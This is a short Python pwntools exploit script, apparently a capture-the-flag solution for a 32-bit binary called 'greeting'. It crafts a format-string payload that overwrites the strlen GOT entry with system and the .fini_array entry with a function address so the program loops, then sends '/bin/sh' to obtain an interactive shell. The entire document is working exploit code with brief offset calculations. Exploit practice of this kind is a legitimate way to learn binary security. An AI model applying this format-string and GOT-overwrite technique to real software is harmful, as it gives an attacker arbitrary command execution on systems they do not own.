from pwn import *

p = process(['./greeting'])

elf = ELF('./greeting')

strlen_got = elf.got['strlen']
fini_array = 0x08049934

# First input = %12$x -> with 2 bytes padding
# calc input 12 + 4

# overwrite strlen -> system = 0x8048490
# 1st = 0x804
# 2nd = 0x8490
# overwrite fini -> getnline = 0x8048614
# 1st = 0x804
# 2nd = 0x8614

print(hex(strlen_got))

payload = b'XX'
payload += b"%2032x%22$n%24$n"
payload += b"%31884x%23$hn"
payload += b"%388x%25$hn"
payload += p32(strlen_got+2)
payload += p32(strlen_got)
payload += p32(fini_array+2)
payload += p32(fini_array)

print(len(payload)) # Should be < 64

# gdb.attach(p,gdbscript="""init-gef
# br *0x0804864f""")

p.sendlineafter(b"... ",payload)
p.sendline(b'/bin/sh')
p.interactive()
